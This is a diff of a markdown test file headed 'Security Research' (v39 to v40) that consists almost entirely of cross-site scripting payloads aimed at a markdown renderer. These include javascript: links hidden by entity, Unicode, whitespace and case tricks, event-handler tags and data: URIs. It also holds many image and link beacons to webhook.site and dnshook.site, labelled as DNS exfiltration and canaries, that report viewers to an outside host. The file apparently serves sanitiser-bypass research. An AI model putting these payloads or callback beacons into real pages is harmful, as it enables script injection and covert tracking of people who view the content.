@@ -1,217 +1,263 @@
-# Security Research - v39
+# Security Research - v40
 
-## GitHub-Specific Features & Anchors
+## Advanced Markdown Edge Cases & Escaping
 
-Testing GitHub-specific markdown features, relative links, and anchor behavior.
-
----
-
-### 1) Relative URL Resolution
-
-[Relative in repo](/test.svg)
-
-[Relative with ../](../progsjessi/README.md)
-
-[Relative to root](/jessi2000/progsjessi)
-
-![Relative img](test.svg)
-
-![Relative parent](../progsjessi/test.svg)
+Testing complex escaping scenarios, nested markdown, and edge cases.
 
 ---
 
-### 2) GitHub Anchor Links
+### 1) Backslash Escaping Attacks
 
-[Jump to heading](#security-research---v39)
+\[test\](javascript:alert(1))
 
-[Anchor with special chars](#1-relative-url-resolution)
+\<script\>alert(1)\</script\>
 
-[Non-existent anchor](#javascript:alert(1))
+\![img](https://webhook.site/b4dc6012-cc6b-4692-a1a9-2a4a42693934/escaped-img.gif)
 
-[Hash only](#)
-
-<h2 id="custom-id">Custom ID Heading</h2>
-
-[Link to custom ID](#custom-id)
-
-<h2 id="javascript:alert(1)">JS in ID attempt</h2>
-
-[Link to JS ID](#javascript:alert(1))
+[normal](https://webhook.site/b4dc6012-cc6b-4692-a1a9-2a4a42693934/normal-link)
 
 ---
 
-### 3) GitHub Flavored Markdown Extensions
+### 2) HTML Entity Encoding in Markdown
 
-#### Autolinks
+&#60;script&#62;alert(1)&#60;/script&#62;
 
-Visit https://webhook.site/8464777c-99e4-4c6a-9ae2-a591ce00730f/autolink for info.
+&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;
 
-Email: test@8464777c-99e4-4c6a-9ae2-a591ce00730f.email.webhook.site
+&lt;script&gt;alert(1)&lt;/script&gt;
 
-www.webhook.site/8464777c-99e4-4c6a-9ae2-a591ce00730f/www-autolink
+![img](&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:alert(1))
 
-#### Strikethrough
-
-~~<script>alert('strikethrough')</script>~~
-
-~~![strike-img](https://webhook.site/8464777c-99e4-4c6a-9ae2-a591ce00730f/strike.gif)~~
-
-#### Emoji
-
-:smile: :+1: :rocket:
-
-:javascript:: test
-
-#### Mentions
-
-@jessi2000 normal mention
-
-@<script>alert(1)</script> script in mention
-
-@javascript:alert(1) js in mention
-
-#### Issue/PR References
-
-#1 normal ref
-
-#<script>alert(1)</script> script in ref
-
-jessi2000/progsjessi#1 cross-repo ref
+<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)">Entity JS</a>
 
 ---
 
-### 4) Table Advanced Features
+### 3) Unicode Normalization
 
-| Column | With | Alignment |
-|:-------|:----:|----------:|
-| Left <script>xss</script> | Center ![](https://webhook.site/8464777c-99e4-4c6a-9ae2-a591ce00730f/table-center.gif) | Right |
-| [Link](javascript:alert(1)) | **Bold** | *Italic* |
-| `code` | ~~strike~~ | normal |
+<a href="j\u0061v\u0061script:alert(1)">Unicode escape JS</a>
+
+<a href="jаvаscript:alert(1)">Cyrillic а</a>
+
+<a href="ｊａｖａｓｃｒｉｐｔ:alert(1)">Fullwidth JS</a>
+
+![Cyrillic](hｔｔｐｓ://webhook.site/b4dc6012-cc6b-4692-a1a9-2a4a42693934/fullwidth.gif)
 
 ---
 
-### 5) Code Block Language Injection
+### 4) Whitespace Injection
 
-```javascript<script>alert(1)</script>
-const x = 1;
+<a href="java
+script:alert(1)">Newline in protocol</a>
+
+<a href="java	script:alert(1)">Tab in protocol</a>
+
+<a href=" javascript:alert(1)">Leading space</a>
+
+<a href="javascript :alert(1)">Space before colon</a>
+
+<a href="\njavascript:alert(1)">Escaped newline</a>
+
+---
+
+### 5) URL Fragment/Query Injection
+
+[Fragment](https://example.com#<script>alert(1)</script>)
+
+[Query XSS](https://example.com?q=<script>alert(1)</script>)
+
+![Fragment img](https://webhook.site/b4dc6012-cc6b-4692-a1a9-2a4a42693934/fragment.gif#<script>)
+
+![Query img](https://webhook.site/b4dc6012-cc6b-4692-a1a9-2a4a42693934/query.gif?xss=<script>)
+
+---
+
+### 6) Reference Links Abuse
+
+[Click me][xss]
+
+[xss]: javascript:alert(1)
+
+[Click me 2][xss2]
+
+[xss2]: https://webhook.site/b4dc6012-cc6b-4692-a1a9-2a4a42693934/ref-link.gif "<script>alert(1)</script>"
+
+[Image ref][imgref]
+
+[imgref]: https://webhook.site/b4dc6012-cc6b-4692-a1a9-2a4a42693934/img-ref.gif
+
+---
+
+### 7) Nested Markdown Constructs
+
+**bold _italic **nested** close_ end**
+
+***bold italic [link](https://webhook.site/b4dc6012-cc6b-4692-a1a9-2a4a42693934/nested-format.gif) text***
+
+~~strikethrough **with bold** and _italic_~~
+
+> Blockquote with ![img](https://webhook.site/b4dc6012-cc6b-4692-a1a9-2a4a42693934/blockquote.gif)
+> And <script>alert(1)</script>
+
+---
+
+### 8) Code Block Escaping
+
+```html
+<script>alert('code block')</script>
 ```
 
-```<img src="https://webhook.site/8464777c-99e4-4c6a-9ae2-a591ce00730f/lang-img.gif">
-some code
+    <script>alert('indented code')</script>
+
 ```
-
-```javascript" onclick="alert(1)
-let y = 2;
-```
-
----
-
-### 6) Inline Code Injection
-
-`<script>alert(1)</script>`
-
-`![img](https://webhook.site/8464777c-99e4-4c6a-9ae2-a591ce00730f/inline-code.gif)`
-
-``double `backtick` test``
-
----
-
-### 7) Alert/Note Blocks (GFM)
-
-> [!NOTE]
-> This is a note <script>alert(1)</script>
-> ![note-img](https://webhook.site/8464777c-99e4-4c6a-9ae2-a591ce00730f/note.gif)
-
-> [!WARNING]
-> This is a warning [click](javascript:alert(1))
-
-> [!IMPORTANT]
-> Important info ![important](https://webhook.site/8464777c-99e4-4c6a-9ae2-a591ce00730f/important.gif)
-
----
-
-### 8) Collapsed Sections
-
-<details>
-<summary>Click to expand <script>alert(1)</script></summary>
-
-![details-img](https://webhook.site/8464777c-99e4-4c6a-9ae2-a591ce00730f/details.gif)
-
-<script>alert('inside details')</script>
-
-[evil link](javascript:alert(1))
-
-</details>
-
-<details open ontoggle="alert(1)">
-<summary onclick="alert(1)">Auto-expanded</summary>
-Content here
-</details>
-
----
-
-### 9) Keyboard Tags
-
-<kbd>Ctrl</kbd>+<kbd><script>alert(1)</script></kbd>
-
-<kbd onclick="alert(1)">Click me</kbd>
-
-<kbd><a href="javascript:alert(1)">JS Link</a></kbd>
-
-<kbd><img src="https://webhook.site/8464777c-99e4-4c6a-9ae2-a591ce00730f/kbd-img.gif"></kbd>
-
----
-
-### 10) Abbreviations/Definitions
-
-*[HTML]: <script>alert('abbr')</script>
-*[CSS]: ![abbr-img](https://webhook.site/8464777c-99e4-4c6a-9ae2-a591ce00730f/abbr.gif)
-
-HTML and CSS are technologies.
-
----
-
-### 11) Math Blocks (if supported)
-
-$x = y$ inline math
-
-$$
-\text{<script>alert(1)</script>}
-$$
-
-$$
-\href{javascript:alert(1)}{click}
-$$
-
----
-
-### 12) Mermaid Diagrams (if supported)
-
-```mermaid
-graph TD
-    A[<script>alert(1)</script>] --> B[Normal]
-    B --> C{Decision}
-    click A "javascript:alert(1)" "XSS Attempt"
+![img](https://webhook.site/b4dc6012-cc6b-4692-a1a9-2a4a42693934/inside-code.gif)
 ```
 
 ---
 
-### 13) Video Embed Syntax (if supported)
+### 9) List Item XSS
 
-https://github.com/user-attachments/assets/video.mp4
+- Normal item
+- <script>alert('list item')</script>
+- ![img](https://webhook.site/b4dc6012-cc6b-4692-a1a9-2a4a42693934/list-item.gif)
+- [link](javascript:alert(1))
 
-https://www.youtube.com/watch?v=<script>alert(1)</script>
+1. Ordered item
+2. <script>alert('ordered')</script>
+3. ![img](https://webhook.site/b4dc6012-cc6b-4692-a1a9-2a4a42693934/ordered-item.gif)
+
+---
+
+### 10) Definition List Style (if supported)
+
+Term 1
+: Definition with <script>alert(1)</script>
+
+Term 2
+: Definition with ![img](https://webhook.site/b4dc6012-cc6b-4692-a1a9-2a4a42693934/definition.gif)
+
+---
+
+### 11) Checkbox/Task List XSS
+
+- [ ] Unchecked <script>alert(1)</script>
+- [x] Checked ![img](https://webhook.site/b4dc6012-cc6b-4692-a1a9-2a4a42693934/checkbox.gif)
+- [ ] <a href="javascript:alert(1)">JS link in task</a>
+
+---
+
+### 12) Footnote XSS (if supported)
+
+Text with footnote[^1]
+
+[^1]: Footnote content <script>alert('footnote')</script> ![img](https://webhook.site/b4dc6012-cc6b-4692-a1a9-2a4a42693934/footnote.gif)
+
+Another footnote[^xss]
+
+[^xss]: javascript:alert(1)
+
+---
+
+### 13) Table Cell Edge Cases
+
+| Header | XSS |
+|--------|-----|
+| Cell | `<script>` in code |
+| <img src=x onerror=alert(1)> | Error handler |
+| <a href="javascript:void(0)">void</a> | Void JS |
+| ![](https://webhook.site/b4dc6012-cc6b-4692-a1a9-2a4a42693934/table-cell.gif) | Image |
+
+---
+
+### 14) Mixed HTML and Markdown
+
+<div>
+
+**Bold inside div**
+
+![img](https://webhook.site/b4dc6012-cc6b-4692-a1a9-2a4a42693934/div-img.gif)
+
+</div>
+
+<p>Paragraph with ![img](https://webhook.site/b4dc6012-cc6b-4692-a1a9-2a4a42693934/p-img.gif)</p>
+
+<span onclick="alert(1)">Click span</span>
+
+---
+
+### 15) URL Scheme Variations
+
+<a href="JAVASCRIPT:alert(1)">Uppercase JS</a>
+
+<a href="JaVaScRiPt:alert(1)">Mixed case JS</a>
+
+<a href="vbscript:msgbox(1)">VBScript</a>
+
+<a href="VBScript:msgbox(1)">Uppercase VBS</a>
+
+<a href="data:text/html,<script>alert(1)</script>">Data HTML</a>
+
+<a href="DATA:text/html,<script>alert(1)</script>">Uppercase data</a>
+
+---
+
+### 16) SVG in Markdown Link
+
+![SVG](https://raw.githubusercontent.com/jessi2000/progsjessi/main/test.svg)
+
+[![SVG Link](https://raw.githubusercontent.com/jessi2000/progsjessi/main/test.svg)](javascript:alert(1))
+
+---
+
+### 17) Base64 Data URI
+
+<img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7">
+
+![Base64](data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7)
+
+---
+
+### 18) Protocol-Relative URLs
+
+![Proto relative](//webhook.site/b4dc6012-cc6b-4692-a1a9-2a4a42693934/proto-relative.gif)
+
+<a href="//webhook.site/b4dc6012-cc6b-4692-a1a9-2a4a42693934/proto-rel-link">Proto relative link</a>
+
+---
+
+### 19) Null Byte Injection
+
+<a href="java%00script:alert(1)">Null in protocol</a>
+
+![Null](https://webhook.site/b4dc6012-cc6b-4692-a1a9-2a4a42693934/null%00byte.gif)
+
+---
+
+### 20) Raw HTML Event Handlers (Extended)
+
+<body onload="alert(1)">
+
+<div onmouseover="alert(1)">Hover me</div>
+
+<input onfocus="alert(1)" autofocus>
+
+<video autoplay onloadstart="alert(1)"><source src="x">
+
+<audio autoplay onloadstart="alert(1)"><source src="x">
+
+<marquee onstart="alert(1)">Marquee</marquee>
+
+<isindex action="javascript:alert(1)">
 
 ---
 
 ### DNS Exfil
 
-![dns](https://v39-dns.8464777c-99e4-4c6a-9ae2-a591ce00730f.dnshook.site/dns.gif)
+![DNS](https://v40-dns.b4dc6012-cc6b-4692-a1a9-2a4a42693934.dnshook.site/dns.gif)
 
 ### Canary
 
-![canary](https://webhook.site/8464777c-99e4-4c6a-9ae2-a591ce00730f/v39-canary.gif)
+![Canary](https://webhook.site/b4dc6012-cc6b-4692-a1a9-2a4a42693934/v40-canary.gif)
 
 ---
 
-*v39 - GitHub-specific features & anchor testing*
+*v40 - Advanced markdown edge cases*
